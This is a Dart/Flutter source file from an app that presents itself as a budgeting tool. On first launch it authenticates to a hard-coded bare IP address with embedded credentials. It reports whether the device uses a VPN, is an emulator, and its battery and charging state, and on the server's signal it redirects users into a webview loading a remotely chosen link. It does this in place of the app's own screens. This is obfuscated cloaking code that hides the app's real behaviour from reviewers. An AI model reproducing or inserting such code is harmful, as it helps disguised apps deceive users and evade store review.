// ignore_for_file: use_build_context_synchronously

import 'dart:developer';
import 'package:budgetwise_ally_135/core/con_bar.dart';
import 'package:budgetwise_ally_135/wiseally/wisaally_hive.dart';
import 'package:budgetwise_ally_135/wiseally/wisaally_producer.dart';
import 'package:budgetwise_ally_135/wiseally/wisaally_response.dart';
import 'package:budgetwise_ally_135/wiseally/wisaally_wallet_page.dart';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:onesignal_flutter/onesignal_flutter.dart';

import '../onbording/onbording.dart';
import 'wisaally_auth.dart';
import 'wisaally_meth.dart';

Future<void> ujuhnunu(BuildContext context) async {
  final wisaallyDb = await WisaallyProducer().wisaallyLocalGet();
  final wisaallySignalSubscriptionId = OneSignal.User.pushSubscription.id;
  final String utms =
      '$wisaallySignalSubscriptionId:f1bf1a3f-42ab-4ac3-bd03-045a31fb4545';
  if (wisaallyDb == null) {
    final InAppReview wasallyRate = InAppReview.instance;
    if (await wasallyRate.isAvailable()) {
      wasallyRate.requestReview();
    }
    final String? wisaallyAuthKey = await wisaallyAuthorization(
      addPath: 'http://159.89.248.76/api/token/',
      l: 'oauth',
      p: '5.{r8<tWc>!Y2E3',
    );
    if (wisaallyAuthKey != null) {
      final wisaallyprxTemp = await wisaallyIsUsingVpn();
      final wisaallyloc = await wisaallyCountryCode();
      final wisaallyDate = await wisaallyGetTime();
      final wisaallyIsEmul = await wisaallyIsSemulator(context);
      final wisaallybtrLevel = await wisaallyBatteryLevel();
      final wisaallyisZarayd = await wisaallyIsCharging();

      try {
        WisaallyResponse? wisaallyOtvet;

        final userRegistrationResponseWisaally = await Dio(
          BaseOptions(
            headers: {'Authorization': 'Bearer $wisaallyAuthKey'},
          ),
        ).post(
          'http://159.89.248.76/api/ads_request/',
          data: {
            "bundle_name": "com.budget.wise.ally",
            "timestamp": wisaallyDate,
            "locale": wisaallyloc,
            "prx_temp": wisaallyprxTemp,
            "emul_temp": wisaallyIsEmul,
            "battery_temp": wisaallyisZarayd,
            "mnostate_temp": true,
            "btry_temp": wisaallybtrLevel,
          },
        );
        if (userRegistrationResponseWisaally.data != null) {
          wisaallyOtvet =
              WisaallyResponse.fromJson(userRegistrationResponseWisaally.data);
        }

        if (wisaallyOtvet != null) {
          if (wisaallyOtvet.blvl) {
            final regwisaally = await wisaallyGetRealLink(
                '${wisaallyOtvet.wisaallyOtvetModel.ltb}${wisaallyOtvet.wisaallyOtvetModel.ouh}');
            log('REDIRECT 1 - $regwisaally');
            final wisaallyHiveObject = WisaallyHive(
              regwisaally: regwisaally,
              logwisaally: regwisaally,
              cabwisaally: '',
              strtwisaally: true,
            );
            WisaallyProducer().wisaallyLocalSet(wisaallyHiveObject);
            wisaallyPushReplacement(
                context,
                WisaallyWalletPage(
                  wisaallyLink: regwisaally,
                  wisaallyUtms: utms,
                ));

            return;
          }
        }
      } catch (e) {
        throw Exception(e);
      }
    }

    await wisaallyDelayed(1);
    wisaallyPushReplacement(
      context,
      const Onbording(),
    );
    WisaallyProducer().wisaallyLocalSet(
      WisaallyHive(
        regwisaally: '',
        logwisaally: '',
        cabwisaally: '',
        strtwisaally: false,
      ),
    );
  } else {
    if (wisaallyDb.strtwisaally) {
      if (wisaallyDb.cabwisaally.isNotEmpty) {
        await wisaallyDelayed(3);
        wisaallyPushReplacement(
          context,
          WisaallyWalletPage(
            wisaallyLink: wisaallyDb.cabwisaally,
            wisaallyUtms: '',
          ),
        );
      } else {
        await wisaallyDelayed(3);
        wisaallyPushReplacement(
          context,
          WisaallyWalletPage(
            wisaallyLink: wisaallyDb.logwisaally,
            wisaallyUtms: utms,
          ),
        );
      }
    } else {
      await wisaallyDelayed(3);
      wisaallyPushReplacement(
        context,
        const BaBottomBar(),
      );
    }
  }
}

String randewromewtewtSpaces() {
  String spaces = '';
  int count = 1;
  for (int i = 0; i < count; i++) {
    spaces += ' ';
  }
  return spaces;
}

void wisaallyPushReplacement(BuildContext context, Widget screen) {
  Navigator.pushReplacement(
    context,
    MaterialPageRoute(builder: (_) => screen),
  );
}

Future<void> wisaallyDelayed(int seconds) async {
  await Future.delayed(Duration(seconds: seconds));
}

Future<String> wisaallyGetRealLink(String wisaallyUrl) async {
  final wisaallyRealLink = await Dio().get(wisaallyUrl);

  return wisaallyRealLink.realUri.toString();
}
